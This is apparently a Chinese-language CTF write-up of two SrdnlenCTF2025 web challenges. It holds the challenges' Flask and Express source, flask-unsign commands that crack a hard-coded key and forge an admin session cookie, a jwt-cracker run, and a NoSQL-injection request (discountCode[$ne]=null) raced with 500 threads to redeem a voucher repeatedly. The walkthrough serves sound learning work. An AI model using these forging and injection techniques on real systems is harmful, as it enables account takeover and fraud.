+++
title = "SrdnlenCTF2025"
slug = "srdnlenctf2025"
description = "shit"
date = "2025-01-19T19:42:32"
lastmod = "2025-01-19T19:42:32"
image = ""
license = ""
categories = ["赛题"]
tags = ["session", "Nosql", "RaceCondition"]
+++

## Ben 10

```python
import secrets
import sqlite3
import os
from flask import Flask, render_template, request, redirect, url_for, flash, session

app = Flask(__name__)
app.secret_key = 'your_secret_key'

DATABASE = 'database.db'
FLAG = os.getenv('FLAG', 'srdnlen{TESTFLAG}')


def init_db():
    """Initialize the SQLite database."""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        username TEXT UNIQUE,
                        password TEXT,
                        admin_username TEXT,
                        reset_token TEXT
                      )''')
    conn.commit()
    conn.close()


def get_user_by_username(username):
    """Helper function to fetch user by username."""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    user = cursor.fetchone()
    conn.close()
    return user


def get_reset_token_for_user(username):
    """Helper function to fetch reset token for a user."""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("SELECT reset_token FROM users WHERE username = ?", (username,))
    token = cursor.fetchone()
    conn.close()
    return token


def update_reset_token(username, reset_token):
    """Helper function to update reset token."""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET reset_token = ? WHERE username = ?", (reset_token, username))
    conn.commit()
    conn.close()


def update_password(username, new_password):
    """Helper function to update the password."""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET password = ?, reset_token = NULL WHERE username = ?", (new_password, username))
    conn.commit()
    conn.close()


@app.route('/')
def index():
    """Redirect to /home if user is logged in, otherwise to /login."""
    if 'username' in session:
        return redirect(url_for('home'))
    return redirect(url_for('login'))


@app.route('/register', methods=['GET', 'POST'])
def register():
    """Handle user registration."""
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        if username.startswith('admin') or '^' in username:
            flash("I don't like admins", "error")
            return render_template('register.html')

        if not username or not password:
            flash("Both fields are required.", "error")
            return render_template('register.html')

        admin_username = f"admin^{username}^{secrets.token_hex(5)}"
        admin_password = secrets.token_hex(8)

        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            cursor.execute("INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)",
                           (username, password, admin_username))
            cursor.execute("INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)",
                           (admin_username, admin_password, None))
            conn.commit()
        except sqlite3.IntegrityError:
            flash("Username already exists!", "error")
            return render_template('register.html')
        finally:
            conn.close()

        flash("Registration successful!", "success")
        return redirect(url_for('login'))

    return render_template('register.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    """Handle user login."""
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        user = get_user_by_username(username)

        if user and user[2] == password:
            session['username'] = username
            return redirect(url_for('home'))
        else:
            flash("Invalid username or password.", "error")

    return render_template('login.html')


@app.route('/reset_password', methods=['GET', 'POST'])
def reset_password():
    """Handle reset password request."""
    if request.method == 'POST':
        username = request.form['username']

        if username.startswith('admin'):
            flash("Admin users cannot request a reset token.", "error")
            return render_template('reset_password.html')

        if not get_user_by_username(username):
            flash("Username not found.", "error")
            return render_template('reset_password.html')

        reset_token = secrets.token_urlsafe(16)
        update_reset_token(username, reset_token)

        flash("Reset token generated!", "success")
        return render_template('reset_password.html', reset_token=reset_token)

    return render_template('reset_password.html')


@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    """Handle password reset."""
    if request.method == 'POST':
        username = request.form['username']
        reset_token = request.form['reset_token']
        new_password = request.form['new_password']
        confirm_password = request.form['confirm_password']

        if new_password != confirm_password:
            flash("Passwords do not match.", "error")
            return render_template('forgot_password.html', reset_token=reset_token)

        user = get_user_by_username(username)
        if not user:
            flash("User not found.", "error")
            return render_template('forgot_password.html', reset_token=reset_token)

        if not username.startswith('admin'):
            token = get_reset_token_for_user(username)
            if token and token[0] == reset_token:
                update_password(username, new_password)
                flash(f"Password reset successfully.", "success")
                return redirect(url_for('login'))
            else:
                flash("Invalid reset token for user.", "error")
        else:
            username = username.split('^')[1]
            token = get_reset_token_for_user(username)
            if token and token[0] == reset_token:
                update_password(request.form['username'], new_password)
                flash(f"Password reset successfully.", "success")
                return redirect(url_for('login'))
            else:
                flash("Invalid reset token for user.", "error")

    return render_template('forgot_password.html', reset_token=request.args.get('token'))


@app.route('/home')
def home():
    """Display home page with images."""
    if 'username' not in session:
        return redirect(url_for('login'))

    username = session['username']

    user = get_user_by_username(username)
    admin_username = user[3] if user else None

    image_names = ['ben1', 'ben2', 'ben3', 'ben4', 'ben5', 'ben6', 'ben7', 'ben8', 'ben9', 'ben10']
    return render_template('home.html', username=username, admin_username=admin_username, image_names=image_names)


@app.route('/image/<image_id>')
def image(image_id):
    """Display the image if user is admin or redirect with missing permissions."""
    if 'username' not in session:
        return redirect(url_for('login'))

    username = session['username']

    if image_id == 'ben10' and not username.startswith('admin'):
        return redirect(url_for('missing_permissions'))

    flag = None
    if username.startswith('admin') and image_id == 'ben10':
        flag = FLAG

    return render_template('image_viewer.html', image_name=image_id, flag=flag)


@app.route('/missing_permissions')
def missing_permissions():
    """Show a message when the user tries to access a restricted image."""
    return render_template('missing_permissions.html')


@app.route('/logout')
def logout():
    """Log the user out and clear the session."""
    session.clear()
    flash("You have been logged out successfully.", "success")
    return redirect(url_for('login'))


if __name__ == '__main__':
    if not os.path.exists(DATABASE):
        init_db()
    app.run(debug=True)

```

看着像是session伪造进行权限读取flag

```
flask-unsign --unsign --cookie "eyJ1c2VybmFtZSI6ImJhb3pvbmd3aSJ9.Z4xkQg.xSfS_q5YG-bJiqbDFVJDCbpTqPQ"

your_secret_key
```

我是真没想到KEY就是这个

```
flask-unsign --sign --cookie "{'username': 'admintest456456456'}" --secret 'your_secret_key'


eyJ1c2VybmFtZSI6ImFkbWludGVzdDQ1NjQ1NjQ1NiJ9.Z4xnHQ.wMdzwuq6NP-3uNFoTpwSfm2XPJ4

/image/ben10
```

拿到flag

## Focus. Speed. I am speed.

```js
<!--route.js--->
const express = require('express')
const isAuth = (req, res, next) => {passport.authenticate('jwt', { session: false, failureRedirect: '/user-login' })(req, res, next)}
const JWT = require('jsonwebtoken')
const router = express.Router()
const passport = require('passport')
const UserProducts = require('../models/userproduct'); 
const Product = require('../models/product'); 
const User = require('../models/user');
const DiscountCodes = require('../models/discountCodes')
const { v4: uuidv4 } = require('uuid');

let delay = 1.5;

router.get('/store', isAuth, async (req, res) => {
    try{
        const all = await Product.find()
        const products = []
        for(let p of all) {
            products.push({ productId: p.productId, Name: p.Name, Description: p.Description, Cost: p.Cost })
        }
        const user = await User.findById(req.user.userId);
        return res.render('store', { Authenticated: true, Balance: user.Balance, Product: products})
    } catch{
        return res.render('error', { Authenticated: true, message: 'Error during request' })
    }
})


router.get('/redeem', isAuth, async (req, res) => {
    try {
        const user = await User.findById(req.user.userId);

        if (!user) {
            return res.render('error', { Authenticated: true, message: 'User not found' });
        }

        // Now handle the DiscountCode (Gift Card)
        let { discountCode } = req.query;
        
        if (!discountCode) {
            return res.render('error', { Authenticated: true, message: 'Discount code is required!' });
        }

        const discount = await DiscountCodes.findOne({discountCode})

        if (!discount) {
            return res.render('error', { Authenticated: true, message: 'Invalid discount code!' });
        }

        // Check if the voucher has already been redeemed today
        const today = new Date();
        const lastRedemption = user.lastVoucherRedemption;

        if (lastRedemption) {
            const isSameDay = lastRedemption.getFullYear() === today.getFullYear() &&
                              lastRedemption.getMonth() === today.getMonth() &&
                              lastRedemption.getDate() === today.getDate();
            if (isSameDay) {
                return res.json({success: false, message: 'You have already redeemed your gift card today!' });
            }
        }

        // Apply the gift card value to the user's balance
        const { Balance } = await User.findById(req.user.userId).select('Balance');
        user.Balance = Balance + discount.value;
        // Introduce a slight delay to ensure proper logging of the transaction 
        // and prevent potential database write collisions in high-load scenarios.
        new Promise(resolve => setTimeout(resolve, delay * 1000));
        user.lastVoucherRedemption = today;
        await user.save();

        return res.json({
            success: true,
            message: 'Gift card redeemed successfully! New Balance: ' + user.Balance // Send success message
        });

    } catch (error) {
        console.error('Error during gift card redemption:', error);
        return res.render('error', { Authenticated: true, message: 'Error redeeming gift card'});
    }
});

router.get('/redeemVoucher', isAuth, async (req, res) => {
    const user = await User.findById(req.user.userId);
    return res.render('redeemVoucher', { Authenticated: true, Balance: user.Balance })
});

router.get('/register-user', (req, res) => {
    return res.render('register-user')
})

router.post('/register-user', (req, res, next) => {
    let { username , password } = req.body
    if (username == null || password == null){
        return next({message: "Error"})
    }
    if(!username || !password) {
        return next({ message: 'You forgot to enter your credentials!' })
    }
    if(password.length <= 2) {
        return next({ message: 'Please choose a longer password.. :-(' })
    }

    User.register(new User({ username }), password, (err, user) => {
        if(err && err.toString().includes('registered')) {
            return next({ message: 'Username taken' })
        } else if(err) {
            return next({ message: 'Error during registration' })
        }

        const jwtoken = JWT.sign({userId: user._id}, process.env.JWT_SECRET, {algorithm: 'HS256',expiresIn: '10h'})
        res.cookie('jwt', jwtoken, { httpOnly: true })

        return res.json({success: true, message: 'Account registered.'})
    })
})

router.get('/user-login', (req, res) => {
    return res.render('user-login')
})

router.post('/user-login', (req, res, next) => {
    passport.authenticate('user-local', (_, user, err) => {
        if(err) {
            return next({ message: 'Error during login' })
        }

        const jwtoken = JWT.sign({userId: user._id}, process.env.JWT_SECRET, {algorithm: 'HS256',expiresIn: '10h'})
        res.cookie('jwt', jwtoken, { httpOnly: true })

        return res.json({
            success: true,
            message: 'Logged'
        })
    })(req, res, next)
})

router.get('/user-logout', (req, res) => {
    res.clearCookie('jwt')
    res.redirect('/')
})

function parseCost(cost) {
    if (cost.toLowerCase() === "free") {
        return 0;
    }
    const match = cost.match(/\d+/); // Extract numbers from the string
    return match ? parseInt(match[0], 10) : NaN; // Return the number or NaN if not found
}

router.post('/store', isAuth, async (req, res, next) => {
    const productId = req.body.productId;

    if (!productId) {
        return next({ message: 'productId is required.' });
    }

    try {
        // Find the product by Name
        const all = await Product.find()
        product = null
        for(let p of all) {
            if(p.productId === productId){
                product = p
            }
        }

        if (!product) {
            return next({ message: 'Product not found.' });
        }

        // Parse the product cost into a numeric value
        let productCost = parseCost(product.Cost);  

        if (isNaN(productCost)) {
            return next({ message: 'Invalid product cost format.' });
        }

        // Fetch the authenticated user
        const user = await User.findById(req.user.userId);

        if (!user) {
            return next({ message: 'User not found.' });
        }

        // Check if the user can afford the product
        if (user.Balance >= productCost) {
            // Generate a UUID v4 as a transaction ID
            const transactionId = uuidv4();
            
            // Deduct the product cost and save the user
            user.Balance -= productCost;
            await user.save();

            // Create a new UserProduct entry
            const userProduct = new UserProducts({
                transactionId: transactionId,
                user: user._id,
                productId: product._id, // Reference the product purchased
            });

            await userProduct.save(); // Save the UserProduct entry

            // Add the UserProduct reference to the user's ownedproducts array
            if (!user.ownedproducts.includes(userProduct._id)) {
                user.ownedproducts.push(userProduct._id);
                await user.save(); // Save the updated user
            }

            // Prepare the response data
            const responseData = {
                success: true,
                message: `Product correctly bought! Remaining balance: ${user.Balance}`,
                product: {
                    Name: product.Name,
                    Description: product.Description,
                },
            };
            if (product.productId === 4) {
                responseData.product.FLAG = product.FLAG || 'No flag available';
            }

            return res.json(responseData);
        } else {
            return res.json({success: false, message: 'Insufficient balance to purchase this product.' });
        }
    } catch (error) {
        console.error('Error during product payment:', error);
        return res.json({success: false, message: 'An error occurred during product payment.' });
    }
});

router.get('/', (req, res, next) => {
    passport.authenticate('jwt', async (err, r) => {
        let { userId } = r
        if (!userId) {
            return res.render('home', {
                Authenticated: false
            })
        }

        try {
            // Fetch the user and populate the ownedproducts, which are UserProducts
            const user = await User.findById(userId)
                .populate({
                    path: 'ownedproducts', // Populate the UserProducts
                    populate: {
                        path: 'productId', // Populate the product details
                        model: 'Product' // The model to fetch the product details
                    }
                })
                .exec()

            // Map the owned products with product details and transactionId
            const ownedproducts = user.ownedproducts.map((userProduct) => {
                const product = userProduct.productId; // Access the populated product details
                return {
                    Name: product.Name,           // Name of the product
                    Description: product.Description, // Description of the product
                    Cost: product.Cost,             // Cost of the product
                    FLAG: product.FLAG || null,      // Flag (only exists for certain products)
                    transactionId: userProduct.transactionId // Add transactionId here
                }
            })

            return res.render('home', {
                Authenticated: true,
                username: user.username,
                Balance: user.Balance,  // Pass balance as a variable to the template
                ownedproducts: ownedproducts // Pass the products with transactionId
            })
        } catch (err) {
            console.error('Error fetching user or products:', err)
            return next(err) // Handle any errors (e.g., database issues)
        }
    })(req, res, next)
})

router.use((err, req, res, next) => {
    res.status(err.status || 400).json({
        success: false,
        error: err.message || 'Invalid Request',
    })
})

module.exports = router
```

```js
<!--app.js--->
const path = require('path');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const express = require('express');
const User = require('../models/user');
const Product = require('../models/product'); 
const DiscountCodes = require('../models/discountCodes'); 
const passport = require('passport');
const { engine } = require('express-handlebars');
const { Strategy: JwtStrategy } = require('passport-jwt');
const cookieParser = require('cookie-parser');

function DB(DB_URI, dbName) {
    return new Promise((res, _) => {
        mongoose.set('strictQuery', false);
        mongoose
            .connect(DB_URI, { useNewUrlParser: true, useUnifiedTopology: true, dbName })
            .then(() => res());
    });
}

// Generate a random discount code
const generateDiscountCode = () => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let discountCode = '';
    for (let i = 0; i < 12; i++) {
        discountCode += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return discountCode;
};



async function App() {
    const app = express();
    app.use(passport.initialize());
    app.use(cookieParser());
    app.use(bodyParser.json());

    app.engine('hbs', engine({ extname: '.hbs', defaultLayout: 'base' }));

    app.use(express.static('static'));
    app.set('view engine', 'hbs');
    app.set('views', path.join(__dirname, '../webviews'));

    app.use('/', require('./routes'));

    passport.use('user-local', User.createStrategy());
    const option = {
        secretOrKey: process.env.JWT_SECRET,
        jwtFromRequest: (req) => req?.cookies?.['jwt'],
        algorithms: ['HS256'],
    };

    

    passport.use(
        new JwtStrategy(option, (payload, next) => {
            User.findOne({ _id: payload.userId })
                .then((user) => {
                    next(null, { userId: user._id } || false);
                })
                .catch((_) => next(null, false));
        })
    );

    const products = [
        { productId: 1, Name: "Lightning McQueen Toy", Description: "Ka-chow! This toy goes as fast as Lightning himself.", Cost: "Free" },
        { productId: 2, Name: "Mater's Tow Hook", Description: "Need a tow? Mater's here to save the day (with a little dirt on the side).", Cost: "1 Point" },
        { productId: 3, Name: "Doc Hudson's Racing Tires", Description: "They're not just any tires, they're Doc Hudson's tires. Vintage!", Cost: "2 Points" },
        { 
            productId: 4, 
            Name: "Lightning McQueen's Secret Text", 
            Description: "Unlock Lightning's secret racing message! Only the fastest get to know the hidden code.", 
            Cost: "50 Points", 
            FLAG: process.env.FLAG || 'SRDNLEN{fake_flag}' 
        }
    ];
    

    for (const productData of products) {
        const existingProduct = await Product.findOne({ productId: productData.productId });
        if (!existingProduct) {
            await Product.create(productData);
            console.log(`Inserted productId: ${productData.productId}`);
        } else {
            console.log(`Product with productId: ${productData.productId} already exists.`);
        }
    }

    // Insert randomly generated Discount Codes if they don't exist
    const createDiscountCodes = async () => {
        const discountCodes = [
            { discountCode: generateDiscountCode(), value: 20 }
        ];

        for (const code of discountCodes) {
            const existingCode = await DiscountCodes.findOne({ discountCode: code.discountCode });
            if (!existingCode) {
                await DiscountCodes.create(code);
                console.log(`Inserted discount code: ${code.discountCode}`);
            } else {
                console.log(`Discount code ${code.discountCode} already exists.`);
            }
        }
    };

    // Call function to insert discount codes
    await createDiscountCodes();

    app.use('/', (req, res) => {
        res.status(404);
        if (req.accepts('html') || req.accepts('json')) {
            return res.render('notfound');
        }
    });

    return app;
}

module.exports = { DB, App };
```

首先登录一下，看到50分就可以买到flag，我其实第一个想到的是逻辑漏洞，不过我们先看路由是什么情况，其中最重要的路由应该就是这个东西了

```js
router.get('/redeem', isAuth, async (req, res) => {
    try {
        const user = await User.findById(req.user.userId);
        if (!user) {
            return res.render('error', { Authenticated: true, message: 'User not found' });
        }
        let { discountCode } = req.query;
        if (!discountCode) {
            return res.render('error', { Authenticated: true, message: 'Discount code is required!' });
        }
        const discount = await DiscountCodes.findOne({ discountCode });
        if (!discount) {
            return res.render('error', { Authenticated: true, message: 'Invalid discount code!' });
        }
        // Check redemption logic...
    } catch (error) {
        console.error('Error during gift card redemption:', error);
        return res.render('error', { Authenticated: true, message: 'Error redeeming gift card' });
    }
});
```

可以用来兑换优惠券，然后就有可能得到分，然后看`app.js`看到有两个地方，一个是折扣码的生成函数，还有一个是JWT的验证机制

```js
const generateDiscountCode = () => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let discountCode = '';
    for (let i = 0; i < 12; i++) {
        discountCode += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return discountCode;
};
```

```js
const option = {
    secretOrKey: process.env.JWT_SECRET,
    jwtFromRequest: (req) => req?.cookies?.['jwt'],
    algorithms: ['HS256'],
};

passport.use(
    new JwtStrategy(option, (payload, next) => {
        User.findOne({ _id: payload.userId })
            .then((user) => {
                next(null, { userId: user._id } || false);
            })
            .catch((_) => next(null, false));
    })
);
```

然后看着像是折扣码任意添加，把函数给拿下来进行生成，发现不行

```js
// generateDiscountCode.js

const generateDiscountCode = () => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let discountCode = '';
    for (let i = 0; i < 12; i++) {
        discountCode += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return discountCode;
};

// 运行并打印生成的折扣码
const discountCode = generateDiscountCode();
console.log('Generated Discount Code:', discountCode);
```

后面看JWT，感觉有点像是把id伪造成0或者是1，就能成功了，看了代码，KEY是环境变量里面有的，也没地方能读文件，那么就爆破密钥先看看，

```
jwt-cracker -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NzhjNmU4ZmQ4YjZmYzFkNTNjYjc1Y2EiLCJpYXQiOjE3MzcyNTY1OTIsImV4cCI6MTczNzI5MjU5Mn0.2ZmYGuMFvr4Usno-VKFwkht0T6JQyvTMgMYV3lt_JL0 --max 6
```

我最开始用的`jwtcrack`一直爆破不出来，电脑风扇叫了好一会了，始终是爆破不出来，问了一下群友，说可以使用`hashcat`进行爆破，还看到一篇文章对jwt另一种特殊情况进行深度解析的  [base64加密的情况](https://mp.weixin.qq.com/s/hscF3h-ae9Qt6B81etdCfg)

后面花哥出了发现问题不对，再次详细看看代码，其实问题就是在这里，这里如果没有查询到的话就不行，但是我们可以利用Nosql注入解决，因为他是在线生成的折扣码，我们也就可以使用`$ne`来匹配所有不等于指定值的值

[findOne造成的Nosql注入](https://blog.csdn.net/Tyro_java/article/details/125339974)  [Nosql注入1](https://www.cnblogs.com/whitehe/p/18578436)   [Nosql注入2](https://blog.csdn.net/u013129300/article/details/137739033)

```js
const discount = await DiscountCodes.findOne({ discountCode });
```

并且优惠券为正常的就加到余额了

```js
const { Balance } = await User.findById(req.user.userId).select('Balance');
user.Balance = Balance + discount.value;
```

而且每天只有加一次，这里可以用条件竞争给解决了，让一天多加几次，打这个包就可以成为加钱居士，我们先把docker搞到服务器上面本地打一下看看能不能行

```
scp -r "C:\Users\baozhongqi\Desktop\SPEED" root@156.238.233.93:~/
docker compose up -d
```

```http
GET /redeem?discountCode[$ne]=null HTTP/1.1
Host: 156.238.233.93
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NzhjYjQ1ODJkZWE3N2U5ZjU3NDEwOTQiLCJpYXQiOjE3MzcyNzQ0NTYsImV4cCI6MTczNzMxMDQ1Nn0.-NvN3tq5IHjWnizrlF9xHzqjqeuZ1yLxulCjFHoXaa4
If-None-Match: W/"e3d-kPgvr9fwOimGBGsWOjHTbiLASS4"
Connection: close


```

开500个线程就成功了，拿到了60分就OK了

